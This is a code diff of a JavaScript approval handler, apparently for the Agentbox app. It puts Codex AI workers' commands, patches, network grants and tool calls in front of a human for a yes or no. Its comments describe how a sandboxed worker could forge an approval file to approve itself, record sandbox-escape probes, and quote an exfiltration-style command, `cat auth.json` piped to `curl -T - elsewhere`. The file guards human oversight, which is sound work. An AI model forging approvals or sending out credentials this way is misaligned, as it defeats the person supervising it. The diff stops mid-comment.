@@ -1,120 +1,42 @@
-// A CODEX WORKER'S GATED COMMAND AND ITS PATCH, ON THE CARD SHE ALREADY KNOWS.
+// The approval handler for Codex workers. It writes each card into the same
+// spool as Claude Code's (main/approvals.mjs), so the renderer draws one card
+// format for both engines, and a file change goes on the same card as a command.
 //
-// main/codex-app-server.mjs raises a server request to a callback and answers
-// whatever that callback returns, with a fifteen-minute deadline and a deny on
-// every failure path. It shipped with nobody on the other end and said so:
-// "the slice that builds the card is the slice that passes a handler". This is
-// the handler, and it is joined to the spool Agentbox already has rather than to
-// a second one -- main/approvals.mjs writes and reads
-// `<storeRoot>/.approvals/<uuid>.request.json`, main/ipc.mjs answers it, and
-// renderer/src/App.tsx draws the card's `<pre>` off `input` without knowing
-// which engine asked. A second card format would be a second thing to keep
-// true, so a file change goes on the SAME card as a command.
+// The founder's answer never comes off the disk on this path. It arrives
+// through main/ipc.mjs and reaches `settle` in process. The spool is inside the
+// store root, which workers can write, so any `<id>.answer.json` that appears
+// for a waiting request is a forgery, and the poll deletes it.
 //
-// ------------------------------------------------------------------------
-// THE ANSWER DOES NOT COME OFF THE DISK, AND THAT IS THE WHOLE SECURITY
-// ARGUMENT OF THIS FILE.
-//
-// The spool sits INSIDE the store root, which workers are given. A Claude Code
-// worker is granted it outright (`writeWorkerSettings` puts the store root in
-// `additionalDirectories`, and `worker-permissions.json` allows Bash broadly),
-// so on that engine a worker able to run a shell could in principle write
-// `<uuid>.answer.json` and approve itself. That path has no alternative: the
-// thing waiting for the answer is a separate process
-// (main/approval-prompt-server.mjs) and a file is the only channel it has.
-//
-// HERE THE THING WAITING IS AGENTBOX ITSELF, so it does not need one. The
-// founder's decision arrives through main/ipc.mjs's single answering door and
-// is handed to `settle` in process; nothing on this path ever reads an answer
-// file. A `<id>.answer.json` that appears for a request still waiting was
-// therefore not written by her, and the poll below DELETES it -- so a forgery
-// is not a weaker approval, it is not an approval, and it does not even leave
-// her card hidden.
-//
-// What the sandbox contributes, measured on this Mac 2026-09-04 against
-// codex-cli 0.148.0 by running `command/exec` under `sandboxPolicy: {type:
-// "workspaceWrite", writableRoots: []}` with the cwd set to a product folder
-// inside a store root under $HOME:
-//
-//     write inside the cwd                        exit 0
-//     write <storeRoot>/.approvals/x.answer.json  "Operation not permitted"
-//     write <storeRoot>/poke.txt                  "Operation not permitted"
-//     write under $TMPDIR                         exit 0
-//
-// So a Codex worker's own commands cannot reach the spool -- with the caveat on
-// the last line, which is real: `workspace-write` leaves /tmp and $TMPDIR
-// writable (`excludeSlashTmp` and `excludeTmpdirEnvVar` both default to false),
-// so a store root under either of those would be reachable. Hers is `~/Zero`.
-// The first run of that probe put its fixture store in `os.tmpdir` and every
-// write "succeeded", which is the false negative worth remembering.
-//
-// That residue is closed as of 2026-09-05 and is written here so nobody
-// reintroduces it. It used to read: between a forged write and the poll that
-// removes it, `listPending` hides that card, because hiding a request that has
-// an answer file is main/approvals.mjs's rule and it is shared with the Claude
-// path. That shared rule now checks the founder's signature, so an answer file
-// she did not write hides nothing on either engine -- and the Claude path,
-// where the answer really does come off the disk, stopped believing one at the
-// same time. main/approvals.mjs holds that argument and what it does not close.
+// Codex's `workspace-write` sandbox stops a worker's commands from writing to
+// the store root, but it leaves /tmp and $TMPDIR writable, so a store root under
+// either is reachable. main/approvals.mjs explains why a forged answer file
+// still hides no card.
 
 import crypto from 'node:crypto';
 import fs from 'node:fs';
 import { appendSpoolLine, cardDigest, removeSpoolEntry, spoolDir, spoolEntryExists, writeSpoolFile } from './approvals.mjs';
 
-// Her deadline and her refusal word, both taken from the transport rather than
-// written again: it closes its own card on the same clock, and a second copy of
-// fifteen minutes would be a second chance to disagree about how long she has.
-import { APPROVAL_TIMEOUT_MS, REFUSAL_DECISION } from './codex-app-server.mjs';
+import { REFUSAL_DECISION } from './codex-app-server.mjs';
 
-// The four words a file change is described by, taken from the reader that
-// already writes them into her trace rather than written a second time here.
 import { fileVerbWord } from './codex.mjs';
 import { Name, isOurSlug } from '../shared/product-name.mjs';
 
-/**
- * How often a waiting card looks for a file nobody should have written. The
- *  same beat main/approval-prompt-server.mjs polls its answers on. */
+/** How often a waiting card sweeps a forged answer and puts itself back on screen. */
 export const POLL_MS = 2_000;
 
-/** The word that lets her yes through. */
 const ACCEPT_DECISION = 'accept';
 
 /**
- * HOW MUCH OF WHAT SHE IS APPROVING GOES ON THE CARD, AND THE ONLY PLACE IT IS
- * DECIDED. One number for both shapes, because one card draws both.
- *
- * The renderer used to slice this to 400 characters, silently, while nothing
- * capped it here -- so she read four hundred characters and authorised however
- * many there were. THE DISPLAY BOUNDARY AND THE ENFORCEMENT BOUNDARY MUST NOT
- * DIFFER, and on this engine that is not a corner case: Codex reads, searches
- * and edits BY RUNNING SHELL COMMANDS, so a long command is the ordinary shape
- * of the thing she is being asked about.
- *
- * Four thousand, which is comfortably above any real command (`sed -n
- * '1,200p' <path>` and a long `git log` filter are tens of characters, not
- * thousands) and short of a card that cannot be read at all. Past it the string
- * is cut ONCE, here, with a mark saying exactly how much went -- so the worst
- * case is a card that says out loud it is not the whole thing, rather than one
- * that looks complete and is not. The `<pre>` on the other end scrolls
- * (max-height 120px, overflow-y auto in renderer/src/styles.css), so everything
- * on the card really is reachable.
- *
- * A PATCH IS THE SHAPE THAT WILL REACH IT FIRST, and the trade-off is stated
- * rather than left to be found: the cut is taken off the END, so a change
- * touching more files than four thousand characters can hold loses the LAST
- * files named rather than the first. That is the same direction the command
- * path cuts in, and the mark says how much went either way.
+ * The most characters of a command or patch that go on a card, and the only
+ * place that limit is set. What the card shows must be what the answer
+ * authorises, so the renderer must not cut it again. Past the cap the end is
+ * cut once, with a mark saying how much went.
  */
 export const CARD_CAP = 4_000;
 
-/**
- * THE FOUR PROTOCOL WORDS `NetworkApprovalContext` CAN CARRY, and nothing else
- * is ever printed as one. Read off the CLI's own schema dump 2026-09-05,
- * `NetworkApprovalProtocol`.
- */
+/** The protocol values in Codex's `NetworkApprovalProtocol` schema. Any other value is not printed. */
 const NETWORK_PROTOCOLS = ['http', 'https', 'socks5Tcp', 'socks5Udp'];
 
-/** The destination a network approval opens, as one line, or nothing. */
 function networkHost(context) {
   if (!context || typeof context !== 'object' || Array.isArray(context)) return '';
   const host = typeof context.host === 'string' ? context.host.trim() : '';
@@ -124,46 +46,30 @@ function networkHost(context) {
 }
 
 /**
- * THE MARK ON AN ELICITATION THAT MAKES IT A TOOL-CALL APPROVAL rather than a
- * form asking her to type something, and the only thing that is read to tell
- * the two apart. Measured on this Mac 2026-09-22, codex-cli 0.153.4: an MCP
- * tool call under `approvalPolicy: untrusted` arrives as
- * `mcpServer/elicitation/request` carrying `_meta.codex_approval_kind:
- * "mcp_tool_call"`, a `message` written by Codex naming the server and the
- * tool, and a `requestedSchema` with no properties at all.
+ * The `_meta.codex_approval_kind` value that marks an elicitation as an MCP
+ * tool-call approval rather than a form asking for typed input. Under
+ * `approvalPolicy: untrusted`, Codex sends every MCP tool call as
+ * `mcpServer/elicitation/request` with this mark and a `message` naming the
+ * server and tool.
  */
 export const MCP_TOOL_CALL_KIND = 'mcp_tool_call';
 
-/** True for the elicitation that is asking whether an MCP tool may run. */
 export function isMcpToolCall(params) {
   const meta = params?._meta;
   if (!meta || typeof meta !== 'object' || Array.isArray(meta)) return false;
   return meta.codex_approval_kind === MCP_TOOL_CALL_KIND;
 }
 
-/** The MCP server this elicitation came from, or ''. */
 export function elicitationServer(params) {
   return typeof params?.serverName === 'string' ? params.serverName.trim() : '';
 }
 
 /**
- * IS THIS ELICITATION OUR OWN STORE, ASKED SO THAT A RENAME CANNOT ANSWER NO.
- *
- * `storeServer` is the name this app wrote into THIS thread's config, so on a
- * thread that started today the two are the same string and this is an equality
- * test. It is not an equality test on a thread that started before the app was
- * renamed, and those are ordinary: a Codex thread is resumed for every reply
- * she writes, the resume is a deep merge over the thread's own config, and the
- * server the old thread registered under the old slug is still on it. The model
- * reads its own transcript, calls the tool by the name it called it by last
- * time, and the app then fails to recognise its own store and either asks her
- * to approve her own plumbing or refuses it.
- *
- * So the question is asked of the app's name history, which `WAS` already keeps
- * for the data folder and the env vars. NOTHING HERE WIDENS THE GRANT BEYOND
- * THIS APP: a name we have never had is not ours, a run with no store server is
- * not covered at all (see `ask`), and the only servers that can be on a worker
- * thread are the ones `mcpIsolation` put there.
+ * True when the elicitation comes from Agentbox's own store server. Any of the
+ * app's past names also counts, because resuming a Codex thread merges over its
+ * old config, so a thread started before a rename still calls the store by the
+ * old name. Only names this app has had match, and a run with no store server
+ * never matches.
  */
 export function isStoreElicitation(params, storeServer) {
   if (!storeServer) return false;
@@ -173,23 +79,13 @@ export function isStoreElicitation(params, storeServer) {
 }
 
 /**
- * ONE MCP TOOL CALL AS A CARD, drawn out of the elicitation itself.
- *
- * There is no itemId on an elicitation and so no `seen` memory to draw it from:
- * what it carries is the server's name, Codex's own sentence naming the tool,
- * and the arguments. Those three are the question, and the arguments are the
- * half that matters, because `claim_work_item` and `write_document` are the
- * same shape of call and two very different things to allow.
- *
- * NOTHING IS INVENTED WHEN THE SENTENCE IS MISSING. A card that says only
- * "an MCP tool" is a card she cannot answer, so this returns null and `ask`
- * refuses out loud, which is the rule the rest of this file already follows.
+ * One MCP tool call as a card: the server, Codex's sentence naming the tool,
+ * and the arguments. Returns null when Codex sent no sentence, so `ask` refuses
+ * rather than drawing a card nobody can answer.
  */
 export function mcpToolCard(params) {
-  // ONLY THE APPROVAL, NEVER THE FORM. The same channel carries an MCP server's
-  // own `elicitation/create`, which is a request for typed input against a real
-  // `requestedSchema`. Drawing that as an allow-or-deny card would put a
-  // question with no answer in front of her, so it is left to `ask` to refuse.
+  // The same channel carries an MCP server's own request for typed input, which
+  // an allow-or-deny card cannot answer, so `ask` refuses it.
   if (!isMcpToolCall(params)) return null;
   const server = elicitationServer(params);
   const said = typeof params?.message === 'string' ? params.message.trim() : '';
@@ -200,12 +96,11 @@ export function mcpToolCard(params) {
   if (args && typeof args === 'object' && Object.keys(args).length) {
     try {
       input.arguments = readable(JSON.stringify(args, null, 2));
-    } catch { /* an unserialisable argument is left off rather than guessed at */ }
+    } catch { /* arguments that cannot be serialised are left off */ }
   }
   return { tool: 'Mcp', input };
 }
 
-/** Whole, or cut once with the size of the cut said out loud. */
 function readable(text) {
   if (text.length <= CARD_CAP) return text;
   const dropped = text.length - CARD_CAP;
@@ -213,24 +108,11 @@ function readable(text) {
 }
 
 /**
- * ONE `fileChange` ITEM AS THE CARD ITS APPROVAL WILL BE DRAWN AS, or null when
- * there is nothing in it that can be said out loud.
- *
- * The approval request itself carries none of this (see `codexApprovalCard`);
- * the ITEM does, and it goes past first. Every change in the item is on the
- * card, because one `apply_patch` can touch several files and she is being
- * asked about all of them at once -- measured: the first patch of the 09-04
- * turn carried an add and a delete together.
- *
- * A CREATION IS NOT A DIFF. `diff` is a unified diff for an `update` and RAW
- * FILE CONTENT for an `add`, so nothing here parses it -- it is her file,
- * printed under the name of her file, whichever of the two shapes it arrived
- * in.
- *
- * `tool` is the word on the card's hint line. One verb for a patch that did one
- * thing, and the class word for a patch that did several, because "Write" over
- * a card that also deletes something would be the card lying about half of
- * itself.
+ * One `fileChange` item as the card its approval will be drawn as, or null when
+ * it names no file. Every change in the item goes on the card, because one
+ * patch can touch several files. `diff` is a unified diff for an update but raw
+ * file content for an add, so it is printed as it came and never parsed.
+ * `tool` is the one verb when every change shares it, and `Edit` otherwise.
  */
 export function fileChangeCard(item) {
   const blocks = [];
@@ -242,9 +124,8 @@ export function fileChangeCard(item) {
     const head = word === 'Move'
       ? `Move ${from} -> ${String(change.kind.move_path).trim()}`
       : `${word} ${from}`;
-    // A trailing newline is a line terminator, not an empty last line -- the
-    // same rule `splitLines` states in main/codex.mjs, and ONE of them, so a
-    // file that really does end in blank lines still shows them.
+    // Drop one trailing newline only, as `splitLines` in main/codex.mjs does, so
+    // a file that really ends in blank lines still shows them.
     const body = String(change.diff ?? '').replace(/\n$/, '');
     blocks.push(body ? `${head}\n${body}` : head);
     if (!words.includes(word)) words.push(word);
@@ -254,115 +135,31 @@ export function fileChangeCard(item) {
 }
 
 /**
- * HOW MANY OF A WORKER'S CHANGES ARE HELD WAITING FOR AN APPROVAL TO NAME THEM.
- *
- * Measured, an approval follows its own `item/started` immediately, so one
- * would do; this exists because "immediately" is an observation about 0.148.0
- * and not a promise, and a turn can have several patches in flight.
- *
- * It is a real bound and not a gesture, which is the lesson CHANGE_FRAME_CAP in
- * main/codex.mjs already records: a frame count is not a memory bound when each
- * frame can carry a whole file. What is held here is the CARD, already cut to
- * `CARD_CAP`, so the worst case is thirty-two times four thousand characters --
- * about 130 KB per worker, and nothing a run that edits in a loop can grow.
+ * How many file-change cards one worker holds while waiting for the approvals
+ * that name them. Codex sends the approval right after `item/started`, but that
+ * is observed, not promised, and a turn can have several patches in flight.
+ * Each card is already cut to `CARD_CAP`, so this bounds memory too.
  */
 export const REMEMBERED_CHANGES = 32;
 
 /**
- * ONE APPROVAL REQUEST AS A CARD, or nothing.
+ * One approval request as a card, or null, which `ask` refuses. `Bash` and
+ * `command` are the keys renderer/src/App.tsx already reads off `input`.
  *
- * `Bash` and `command` are not a new vocabulary invented for this engine: they
- * are the two keys renderer/src/App.tsx already reads off `input`, and Codex
- * really does read, search and edit by running shell commands, so the honest
- * spelling is also the matching one. `reason` becomes `description`, which is
- * the line the card draws above the command.
+ * A file-change approval carries no path and no diff. Codex sends the same
+ * item on `item/started` before the approval, so the card comes from `seen`,
+ * which `remember` fills per worker. An approval for an item this worker never
+ * saw is refused, so the founder never answers a card she cannot read.
  *
- * ------------------------------------------------------------------------
- * A PATCH IS CARDED FROM THE ITEM, NOT FROM THE APPROVAL, AND THAT IS WHAT
- * LETS A CODEX WORKER WRITE A FILE AT ALL.
+ * `item/permissions/requestApproval` is always refused, because its params say
+ * nothing about what would be allowed.
  *
- * `FileChangeRequestApprovalParams` carries itemId, threadId, turnId,
- * startedAtMs, an optional reason and an optional `grantRoot`. No path, no
- * diff, no sentence -- measured in full on 2026-09-04:
+ * A command approval shows every entry of `commandActions`, not the first, and
+ * the network host it would open, so the card shows all that a yes allows.
  *
- *   {"threadId":"...","turnId":"...","itemId":"call_eBjH...",
- *    "startedAtMs":1788504140524,"reason":null,"grantRoot":null}
- *
- * So this file used to refuse it, correctly on its own terms and at a price
- * that turned out to be the whole integration. `WORKER_APPROVAL_POLICY` is
- * `untrusted` (main/codex-session.mjs), which is the only policy that cards
- * risky commands, and it also cards every patch -- so a refusal here was a
- * worker that could not write one file. Measured, cwd a fresh git repo,
- * sandbox `workspace-write`:
- *
- *   untrusted   risky commands CARDED, in-workspace patch raised the
- *               undrawable fileChange -> refused -> nothing written
- *   on-request  commands NOT carded, patch ran unasked (so did a `curl` to
- *               the open internet on a second probe)
- *   granular    commands NOT carded, patch ran unasked
- *
- * THE CARD CAN BE DRAWN HONESTLY AFTER ALL. `item/started` for the same
- * fileChange arrives BEFORE the approval and carries the real content --
- * three approvals out of three in the measured turn, `item/completed` only
- * ever AFTER the answer:
- *
- *   item/started    fileChange id=call_ylWd... changes=2
- *   APPROVAL        item/fileChange/requestApproval itemId=call_ylWd...
- *   item/completed  fileChange id=call_ylWd... changes=2
- *
- * `seen` is that memory, one per worker (see `scope` below), and the card is
- * the one `fileChangeCard` already built when the item went past.
- *
- * AN ITEM THIS WORKER NEVER SAW IS STILL REFUSED, and that is the line that
- * must not move: a card she answers blind is the 2026-08-05 flood again, so an
- * approval naming an unknown change gets null and the transport's deny, exactly
- * as before. Refusing is cheap and visible -- it goes to the worker's own
- * stderr, so `troubleCause` and the run trace both carry it.
- *
- * `item/permissions/requestApproval` IS STILL REFUSED OUTRIGHT, and there is no
- * item behind it to rescue it: it is answered with a granted-permissions
- * profile rather than a decision, and its params carry nothing that could be
- * put in front of her as a sentence saying what she is allowing.
- *
- * A command approval WITH NO COMMAND is NOT the same judgement any more, and
- * that is the correction. The schema makes `command` nullable, and this used to
- * look at the first parsed action and then refuse -- while the same params
- * carried `networkApprovalContext`, which names the host the sandbox would be
- * opened to. Refusing something we could have described honestly is the
- * opposite failure to carding something we could not, and it is worse: it
- * denies work she would have allowed and tells her nothing about why.
- *
- * AND THE NETWORK GRANT GOES ON THE CARD BESIDE THE COMMAND, WHICH IS THE HALF
- * THAT WAS SILENTLY MISSING. `curl` and the host it reaches are two facts and
- * the card drew one of them, so she could authorise a displayed command without
- * seeing the destination it opens. Measured from the CLI's own schema dump on
- * this Mac 2026-09-05 (`codex app-server generate-json-schema --out <dir>`,
- * codex-cli 0.148.0), CommandExecutionRequestApprovalParams:
- *
- *   networkApprovalContext  { host: string,
- *                             protocol: "http"|"https"|"socks5Tcp"|"socks5Udp" }
- *                           | null   "Optional context for a managed-network
- *                                     approval prompt."
- *   commandActions          CommandAction[] | null, every variant carrying its
- *                           own `command` string -- "Best-effort parsed command
- *                           actions for friendly display."
- *
- * `commandActions` IS READ IN FULL RATHER THAN AT ITS FIRST ENTRY, for the
- * reason `readable` exists at all: the display boundary and the enforcement
- * boundary must not differ, and `[cat auth.json, curl -T - elsewhere]` shown as
- * its first line is a card that is true about a tenth of what it authorises.
- *
- * THE PROTOCOL IS PRINTED ONLY WHEN IT IS ONE OF THE FOUR WORDS THE SCHEMA
- * ENUMERATES. A release that adds a fifth would otherwise put an unvouched-for
- * word under a question about her machine; the host is the fact either way, so
- * the host is said either way.
- *
- * WHAT AN ALLOW IS STILL NOT. `CommandExecutionApprovalDecision` also holds
- * `acceptWithExecpolicyAmendment` and `applyNetworkPolicyAmendment`, which
- * write a PERSISTENT rule for a command shape or a host, and the params carry
- * `proposedExecpolicyAmendment` and `proposedNetworkPolicyAmendments` offering
- * them. This file answers `accept` or `decline` and nothing else, so one card is
- * one request and a yes she gave to one command never becomes a standing grant.
+ * Codex also offers decisions that write a lasting rule for a command shape or
+ * a host. This app only ever answers `accept` or `decline`, so a yes to one
+ * command never becomes a standing grant.
  */
 export function codexApprovalCard(method, params, seen = null) {
   const p = params ?? {};
@@ -376,12 +173,9 @@ export function codexApprovalCard(method, params, seen = null) {
     const input = { ...known.input };
     const why = typeof p.reason === 'string' ? p.reason.trim() : '';
     if (why) input.description = why;
-    // THE TREE THE PATCH ASKS TO OPEN, WHICH IS NOT IN THE DIFF ABOVE IT.
-    // `grantRoot`, from the same schema dump: "[UNSTABLE] When set, the agent is
-    // asking the user to allow writes under this root for the remainder of the
-    // session." So an accept on one visible file can be read as opening a whole
-    // tree until the run ends, and the card drew the file. Nearly every patch
-    // sends null and then nothing is added, exactly as `cwd` behaves.
+    // Codex's schema says a set `grantRoot` asks to allow writes under that root
+    // for the rest of the session, so an accept can open more than the diff
+    // shows, and the card must say so.
     const root = typeof p.grantRoot === 'string' ? p.grantRoot.trim() : '';
     if (root) input.grantRoot = root;
     return { tool: known.tool, input };
@@ -398,14 +192,8 @@ export function codexApprovalCard(method, params, seen = null) {
   const input = {};
   if (command) input.command = readable(command);
   if (host) input.host = host;
-  // WHERE IT WOULD RUN, WHICH IS HALF OF WHAT THE COMMAND MEANS. `cat
-  // auth.json` in a scratch clone and `cat auth.json` in her home directory are
-  // the same eleven characters and two different questions.
-  // `CommandExecutionRequestApprovalParams` has carried `cwd` all along -- "The
-  // command's working directory", read out of the CLI's own
-  // `generate-json-schema` dump on 2026-09-04 -- and nothing was reading it.
-  // Left OFF entirely when the server did not say one, because a card drawing
-  // the word "undefined" under a command is worse than a card drawing nothing.
+  // The same command means different things in different folders, so the card
+  // shows where it would run when Codex says.
   const cwd = typeof p.cwd === 'string' ? p.cwd.trim() : '';
   if (cwd) input.cwd = cwd;
   const reason = typeof p.reason === 'string' ? p.reason.trim() : '';
@@ -414,59 +202,39 @@ export function codexApprovalCard(method, params, seen = null) {
 }
 
 /**
- * THE SPOOL, FROM AGENTBOX'S SIDE OF IT.
+ * The Codex side of the approval spool, one per supervisor and shared by every
+ * Codex worker. `uuid`, `now` and `pollMs` are injectable for tests.
  *
- * One of these per supervisor, shared by every Codex worker on the machine:
- * the request ids are UUIDs and the founder answers them one at a time, so
- * there is nothing per-worker to keep apart.
- *
- * `uuid` and `now` are injected so a test can name a card, and `timeoutMs` and
- * `pollMs` so it does not have to wait a quarter of an hour to watch a silence
- * deny itself.
+ * A CARD WAITS FOR THE PERSON IT ASKS, AND NO CLOCK ANSWERS FOR THEM
+ * (w-4b00022acb). There was a fifteen-minute deadline here, and what it sent
+ * at the end of it was a deny the turn could not tell from theirs: work nobody
+ * had refused came back refused. It was safe only while a waiting card was
+ * invisible, and it is not now, because the row reads Asking and sits in Needs
+ * you (w-fe48447cab). So what settles a card is always an event: their answer,
+ * the worker stopping (`close` on its scope), the app shutting down, the
+ * connection breaking.
  */
 export function createCodexApprovals({
   storeRoot,
-  timeoutMs = APPROVAL_TIMEOUT_MS,
   pollMs = POLL_MS,
   uuid = () => crypto.randomUUID(),
   now = () => Date.now(),
   onChange = null,
 } = {}) {
   const dir = spoolDir(storeRoot);
-  const open = new Map(); // id -> { request, scope, decide, deadline, poll }
+  const open = new Map(); // id -> { request, scope, decide, poll }
 
   /**
-   * Ask her one question, and never come back with nothing.
-   *
-   * The promise this returns is the one main/codex-app-server.mjs is holding
-   * the server request open on. It resolves with a word the transport can
-   * translate, or with the refusal; it never rejects and it never hangs,
-   * because a promise nobody settles is a worker parked with no exit code and
-   * nothing on the row, which is the failure that file was written around.
+   * The promise main/codex-app-server.mjs holds the server request open on.
+   * It always resolves, with accept or the refusal, and never rejects or hangs,
+   * because an unsettled promise parks the worker forever.
    */
   const ask = (context, method, params, seen = null) => new Promise((resolve) => {
-    // AGENTBOX'S OWN STORE TOOLS ARE NOT A QUESTION FOR THE FOUNDER, AND ASKING
-    // HER ONE FOR EACH OF THEM WOULD BE THE SAME FAILURE AS REFUSING THEM.
-    //
-    // A Codex worker reaches the store the only way this engine has: an MCP tool
-    // call, which under `untrusted` raises the elicitation above. Claiming a
-    // row, writing a checkpoint and finishing one are therefore three cards she
-    // would have to press before a worker could say anything at all, on every
-    // run, and that is the plumbing rather than the work. The Claude Code path
-    // says the same thing in its own grammar and has all along: the store
-    // server's tools are granted outright in `worker-permissions.json` and never
-    // reach her spool.
-    //
-    // THE NAME IS THE ONE AGENTBOX LAUNCHED, not one a worker can claim. It comes
-    // from `_codexStoreServer` through `scope`, and the only servers on a worker
-    // thread are the ones `mcpIsolation` wrote into `thread/start` -- everything
-    // in her own config is switched off there by name. So a server answering to
-    // this name is the one this app started, with the account id, the product
-    // and the work item already fixed in its environment.
-    //
-    // EVERY OTHER MCP TOOL CALL STILL GOES TO HER, as a card drawn by
-    // `mcpToolCard`, and a personal session (which is given no store server at
-    // all) has nothing that takes this path.
+    // Calls to Agentbox's own store server are allowed without a card, as the
+    // Claude Code path allows them in `worker-permissions.json`. The server name
+    // comes from the app through `scope`, not from the worker, and
+    // `mcpIsolation` makes sure the only MCP servers on a worker thread are ours.
+    // Every other MCP tool call still goes to the founder as a card.
     if (method === 'mcpServer/elicitation/request'
       && isMcpToolCall(params)
       && isStoreElicitation(params, context?.storeServer)) {
@@ -476,24 +244,10 @@ export function createCodexApprovals({
 
     const card = codexApprovalCard(method, params, seen);
     if (!card) {
-      // VISIBLE ON THE RUN, NOT ONLY IN A LOG SHE WILL NEVER OPEN.
-      //
-      // Anything that cannot be described is refused, and that is right rather
-      // than lazy: a card she answers blind is the 2026-08-05 flood again. But
-      // the only signal used to be a `console.warn`, which reaches no screen, no
-      // row and no trace, so the symptom of a worker being refused every edit it
-      // tried was a run that talked and changed nothing.
-      //
-      // THE TWO REASONS ARE NOT THE SAME REASON and the line says which, because
-      // one of them is a live defect and the other is a decision. A `permissions`
-      // request carries nothing describable at all. A `fileChange` naming an item
-      // this worker never saw means the memory the card is drawn from missed it,
-      // which is something to go and look at (see `remember` below).
-      //
-      // `context.say` is the worker's own stderr emitter, which is the pipe
-      // `troubleCause` classifies a dead run from and the one the persisted
-      // trace records. The console line stays for a scope nobody wired a `say`
-      // to, which is a test and never a worker.
+      // Anything that cannot be described is refused. The refusal goes to the
+      // worker's own stderr through `context.say`, so `troubleCause` and the run
+      // trace both show it, and it names its reason. An unseen file change
+      // means `remember` missed an item, which is a bug to look into.
       const why = method === 'item/fileChange/requestApproval'
         ? 'this run never saw the file change it names, so there is nothing it could put in front of the founder to answer'
         : method === 'mcpServer/elicitation/request'
@@ -516,11 +270,9 @@ export function createCodexApprovals({
       input: card.input,
     };
 
-    // EVERY TOUCH OF THE SPOOL GOES THROUGH main/approvals.mjs, because that
-    // directory is worker-writable and the rule about what may be opened in it
-    // belongs in one place. `writeSpoolFile` creates at a name nothing can
-    // guess and renames onto the real one, so nothing here can be pre-created
-    // or followed.
+    // The spool is worker-writable, so every file operation on it goes through
+    // main/approvals.mjs, the one place that guards against planted files and
+    // links.
     let put = false;
     try {
       fs.mkdirSync(dir, { recursive: true });
@@ -529,58 +281,68 @@ export function createCodexApprovals({
       console.warn('zero: could not put a codex approval in the spool:', err?.message ?? err);
     }
     if (!put) {
-      // A question that cannot be asked has already been answered.
       resolve(REFUSAL_DECISION);
       return;
     }
 
     const entry = {
       request,
-      // WHICH WORKER ASKED. A card is a question one run is parked on, so it
-      // has no meaning once that run has stopped -- see `scope` below.
+      // The worker that asked, so `close` can deny its cards when it stops.
       scope: context?.scope ?? null,
       decide(allow, note, extra) {
         if (!open.delete(id)) return false;
-        clearTimeout(entry.deadline);
         clearInterval(entry.poll);
         finish(id, request, { allow: !!allow, note: note ?? null, at: now(), ...extra });
         resolve(allow ? ACCEPT_DECISION : REFUSAL_DECISION);
         return true;
       },
     };
-    entry.deadline = setTimeout(() => entry.decide(false, null, { timeout: true }), timeoutMs);
-    entry.deadline?.unref?.();
-    // NOBODY SHOULD EVER WRITE THIS FILE. Her answer comes in through `settle`,
-    // so one on the disk is a worker's, and it is removed rather than read.
-    entry.poll = setInterval(() => sweepForgery(id), pollMs);
+    // The real answer comes through `settle`, so an answer file is a worker's
+    // forgery and is deleted unread. The same beat puts the request back if
+    // anything took it out of the spool while this card was still waiting.
+    entry.poll = setInterval(() => tend(id), pollMs);
     entry.poll?.unref?.();
     open.set(id, entry);
     onChange?.();
   });
 
-  function sweepForgery(id) {
-    if (!open.has(id)) return;
+  /**
+   * One beat of a waiting card: sweep an answer nobody signed, and put the
+   * request back on screen if it has gone.
+   *
+   * THE SPOOL REAPS WHAT NOBODY IS WAITING ON, AND THIS IS HOW IT KNOWS.
+   * `listPending` cannot read this map, and a card that waits for a person
+   * outlives its REQUEST_TTL_MS, so whoever is waiting keeps its own request
+   * there and the sweep only ever takes one nobody is holding up.
+   */
+  function tend(id) {
+    const entry = open.get(id);
+    if (!entry) return;
     const forged = `${id}.answer.json`;
-    // `lstat`, not `existsSync`: a dangling link is an entry `readdir` can see,
-    // so `listPending` hides her card for it while `existsSync` reports
-    // nothing to sweep. And `rm`, not `unlink`, because a worker can squat the
-    // name with a directory, which `unlink` refuses (EPERM, measured) and
-    // which would then hide the card until the spool's own TTL.
-    if (!spoolEntryExists(dir, forged)) return;
-    removeSpoolEntry(dir, forged);
-    console.warn(`zero: an answer file appeared for approval ${id} that the founder did not write; it has been deleted and the card is still waiting`);
-    onChange?.();
+    // These helpers also catch a dangling link, which `existsSync` misses, and
+    // a directory squatting the name, which `unlink` cannot remove.
+    if (spoolEntryExists(dir, forged)) {
+      removeSpoolEntry(dir, forged);
+      console.warn(`zero: an answer file appeared for approval ${id} that the founder did not write; it has been deleted and the card is still waiting`);
+      onChange?.();
+    }
+    const name = `${id}.request.json`;
+    if (spoolEntryExists(dir, name)) return;
+    // Written from the request this process has held all along, never read back
+    // off the disk: the card that comes back is the card that went.
+    if (writeSpoolFile(dir, name, JSON.stringify(entry.request))) { onChange?.(); return; }
+    // Failing here leaves the worker parked with nothing on screen, which is
+    // the one way the wait goes bad, so it is said out loud. Once per card:
+    // this beat runs every two seconds.
+    if (!entry.saidItCouldNotGoBack) {
+      entry.saidItCouldNotGoBack = true;
+      console.warn(`zero: approval ${id} left the spool and could not be put back, so the worker waiting on it has no card on screen`);
+    }
   }
 
-  /**
-   * One audit line per decision, and the pair leaves the spool. The same
-   *  ending main/approval-prompt-server.mjs gives a Claude Code worker's card,
-   *  because nothing else is going to reap these. */
+  /** Writes one audit line per decision and removes the request and answer files. */
   function finish(id, request, decided) {
-    // Never held hostage to its own log line, which is why the return is
-    // ignored -- and why `appendSpoolLine` destroys a planted link rather than
-    // only refusing to follow one: a silent refusal here would hand a worker
-    // the audit trail for good.
+    // A failed log write must not block the decision, so the return is ignored.
     appendSpoolLine(dir, 'log.jsonl', `${JSON.stringify({ ...request, answer: decided, decidedAt: now() })}\n`);
     for (const f of [`${id}.request.json`, `${id}.answer.json`]) removeSpoolEntry(dir, f);
     onChange?.();
@@ -590,48 +352,22 @@ export function createCodexApprovals({
 
   return {
     /**
-     * ONE WORKER'S CARDS, AND A WAY TO END THEM WITH IT.
-     *
-     * Every Codex worker used to raise into one fleet-wide map with nothing
-     * per-worker in it, so killing a worker ended its facade and interrupted its
-     * turn and did NOT deny or remove its card. A stopped, preempted, archived
-     * or app-server-lost worker left a live-looking question on screen for the
-     * full fifteen minutes.
-     *
-     * That is not a card that merely lingers. `listPending` sorts oldest first
-     * and every answering route acts on `listPending[0]`, so the DEAD card sits
-     * in front of every real one until its deadline: she presses ⌘Y for the
-     * card she is reading and answers a worker that stopped ten minutes ago.
-     *
-     * `close` is what the worker's own exit calls. It denies this scope's open
-     * cards, once each, through the same `decide` her answer goes through -- so
-     * the audit line is written, the request file leaves the spool, and the
-     * promise the transport is holding the server request open on resolves with
-     * the refusal rather than being dropped.
